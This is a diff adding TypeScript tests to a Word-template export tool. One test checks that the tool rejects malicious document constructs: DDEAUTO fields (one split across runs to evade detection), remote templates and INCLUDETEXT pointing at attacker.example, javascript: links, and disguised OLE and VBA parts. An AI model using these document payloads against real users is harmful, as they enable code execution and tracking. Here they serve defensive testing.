@@ -107,3 +107,58 @@ test('Word export disables automatic field recalculation even when a template en
  const template=zip(files),output=buildWordFromTemplate(template,inspectWordTemplate(template).configuration,content),settings=xml(output,'word/settings.xml');
  assert.match(settings,/<w:updateFields w:val="false"\/>/);assert.doesNotMatch(settings,/<x:updateFields/);assert.match(settings,/<x:compat\/>/);
 });
+
+test('Word templates reject active fields, embedded objects and external resources while preserving safe hyperlinks',()=>{
+ const source=unzipOffice(wordTemplateFixture());
+ const document=(addition:string)=>zip(source.map(file=>file.name==='word/document.xml'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</w:body>',addition+'</w:body>'))}:file));
+ for(const instruction of ['DDEAUTO server topic item','INCLUDETEXT "https://attacker.example/remote.docx"','INCLUDEPICTURE "file:///private/image.png"','LINK Excel.Sheet.12 file item','DATABASE source']){
+  assert.throws(()=>inspectWordTemplate(document(`<w:p><w:fldSimple w:instr='${instruction}'/></w:p>`)),/aktive Inhalte/);
+ }
+ assert.throws(()=>inspectWordTemplate(document('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO server topic item</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')),/aktive Inhalte/);
+ assert.throws(()=>inspectWordTemplate(document('<w:altChunk r:id="html"/>')),/aktive Inhalte/);
+ for(const [type,target] of [['attachedTemplate','https://attacker.example/template.dotm'],['image','https://attacker.example/tracking.png'],['hyperlink','file:///private/document'],['hyperlink','javascript:alert(1)']]){
+  const bytes=zip(source.map(file=>file.name==='word/_rels/document.xml.rels'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Relationships>',`<Relationship Id="unsafe" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}" TargetMode="External"/></Relationships>`))}:file));
+  assert.throws(()=>inspectWordTemplate(bytes),/aktive Inhalte/);
+ }
+ assert.throws(()=>inspectWordTemplate(zip([...source,{name:'word/embeddings/object.bin',data:Buffer.from('embedded OLE')}])),/eingebettete Objekte/);
+ const disguisedObject=zip(source.map(file=>file.name==='word/_rels/document.xml.rels'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Relationships>','<Relationship Id="object" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="custom.bin"/></Relationships>'))}:file).concat({name:'word/custom.bin',data:Buffer.from('embedded OLE with an arbitrary filename')}));
+ assert.throws(()=>inspectWordTemplate(disguisedObject),/aktive Inhalte/);
+ const disguisedXml=zip(source.map(file=>file.name==='[Content_Types].xml'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Types>','<Override PartName="/word/custom.dat" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"/></Types>'))}:file).concat({name:'word/custom.dat',data:Buffer.from('<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:fldSimple w:instr="DDEAUTO server topic item"/></w:p></w:hdr>')}));
+ assert.throws(()=>inspectWordTemplate(disguisedXml),/aktive Inhalte/);
+ const disguised=zip(source.map(file=>file.name==='[Content_Types].xml'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Types>','<Override PartName="/word/innocent.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'))}:file));
+ assert.throws(()=>inspectWordTemplate(disguised),/Makros/);
+ const safe=zip(source.map(file=>file.name==='word/_rels/document.xml.rels'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Relationships>','<Relationship Id="safe" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>'))}:file));
+ assert.doesNotThrow(()=>buildWordFromTemplate(safe,inspectWordTemplate(safe).configuration,content));
+});
+
+test('empty meeting metadata clears sample control values and stale dates without changing unknown controls',()=>{
+ const controls='<w:sdt><w:sdtPr><w:alias w:val="Ort"/><w:text/></w:sdtPr><w:sdtContent><w:p><w:r><w:t>OLD ROOM</w:t></w:r></w:p></w:sdtContent></w:sdt><w:sdt><w:sdtPr><w:alias w:val="Datum"/><w:date w:fullDate=\'2000-01-01T00:00:00Z\'><w:dateFormat w:val="dd.MM.yyyy"/></w:date></w:sdtPr><w:sdtContent><w:p><w:r><w:t>OLD DATE</w:t></w:r></w:p></w:sdtContent></w:sdt><w:sdt><w:sdtPr><w:alias w:val="Anwesenheit"/><w:text/></w:sdtPr><w:sdtContent><w:p><w:r><w:t>Keep manual attendance</w:t></w:r></w:p></w:sdtContent></w:sdt>';
+ const template=zip(unzipOffice(wordTemplateFixture()).map(file=>file.name==='word/document.xml'?{...file,data:Buffer.from(file.data.toString('utf8').replace('<w:body>','<w:body>'+controls))}:file));
+ const info=inspectWordTemplate(template);
+ const empty=xml(buildWordFromTemplate(template,info.configuration,{...content,values:{ORT:'',DATUM:'',ISO_DATUM:''}}));
+ assert.doesNotMatch(empty,/OLD ROOM|OLD DATE|fullDate=/);assert.match(empty,/Keep manual attendance/);
+ const filled=xml(buildWordFromTemplate(template,info.configuration,{...content,values:{ORT:'New room',DATUM:'10.11.2026',ISO_DATUM:'2026-11-10T17:00:00.000Z'}}));
+ assert.match(filled,/w:fullDate="2026-11-10T17:00:00.000Z"/);assert.doesNotMatch(filled,/2000-01-01/);assert.match(filled,/New room/);
+});
+
+test('Word export removes XML-forbidden Unicode while retaining valid supplementary characters',()=>{
+ const template=wordTemplateFixture(),info=inspectWordTemplate(template);
+ const document=xml(buildWordFromTemplate(template,info.configuration,{...content,topics:[{...content.topics[0],title:'Valid 😀 text\uFFFE\uFFFF\uD800'}]}));
+ assert.match(document,/Valid 😀 text/);assert.doesNotMatch(document,/[\uFFFE\uFFFF\uD800]/u);
+});
+
+test('empty text controls receive meeting metadata',()=>{
+ const control='<w:sdt><w:sdtPr><w:alias w:val="Ort"/><w:text/></w:sdtPr><w:sdtContent><w:p><w:r><w:t/></w:r></w:p></w:sdtContent></w:sdt>';
+ const template=zip(unzipOffice(wordTemplateFixture()).map(file=>file.name==='word/document.xml'?{...file,data:Buffer.from(file.data.toString('utf8').replace('<w:body>','<w:body>'+control))}:file));
+ const document=xml(buildWordFromTemplate(template,inspectWordTemplate(template).configuration,content));
+ assert.match(document.match(/<w:sdt>[^]*?<\/w:sdt>/)![0],/<w:t>Room &lt;&amp;&gt; \$&amp;<\/w:t>/);
+});
+
+test('reordered Word sections retain inherited headers inside empty section properties',()=>{
+ const ns='http://schemas.openxmlformats.org/wordprocessingml/2006/main';
+ const document=`<w:document xmlns:w="${ns}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body><w:p><w:r><w:t>Letterhead</w:t></w:r></w:p><w:p><w:pPr><w:sectPr><w:headerReference w:type="default" r:id="header"/></w:sectPr></w:pPr></w:p><w:p><w:r><w:t>Nicht öffentlicher Teil</w:t></w:r></w:p><w:p><w:pPr><w:sectPr/></w:pPr></w:p><w:p><w:r><w:t>Öffentlicher Teil</w:t></w:r></w:p><w:sectPr/></w:body></w:document>`;
+ const source=unzipOffice(wordTemplateFixture()).map(file=>file.name==='word/document.xml'?{...file,data:Buffer.from(document)}:file.name==='word/_rels/document.xml.rels'?{...file,data:Buffer.from(file.data.toString('utf8').replace('</Relationships>','<Relationship Id="header" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/></Relationships>'))}:file);
+ const template=zip(source),info=inspectWordTemplate(template),result=xml(buildWordFromTemplate(template,{...info.configuration,insertion:'replace',start:1,end:5},content));
+ assert.equal((result.match(/<w:sectPr><w:headerReference/g)??[]).length,3,'each retained section explicitly owns its inherited header reference');
+ assert.doesNotMatch(result,/<w:sectPr\/><w:headerReference/);
+});
